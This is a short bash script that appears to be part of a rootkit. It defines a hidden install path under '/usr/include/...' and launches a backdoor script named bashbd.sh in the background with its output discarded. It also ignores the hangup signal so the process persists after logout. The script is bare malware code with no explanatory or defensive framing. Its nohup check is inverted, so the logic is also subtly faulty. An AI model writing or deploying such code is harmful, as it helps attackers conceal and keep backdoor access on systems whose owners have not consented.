#!/bin/bash

BR_ROOTKIT_PATH="/usr/include/..."

function br_hookhup()
{
        :
}

function br_daemon()
{
	if ! type nohup >/dev/null; then
                nohup $BR_ROOTKIT_PATH/bashbd.sh > /dev/null 2>&1
                [ $? -eq 1 ] && exit
        else
                trap br_hookhup SIGHUP
                $BR_ROOTKIT_PATH/bashbd.sh > /dev/null 2>&1 &
                [ $? -eq 1 ] && exit
        fi
}

br_daemon
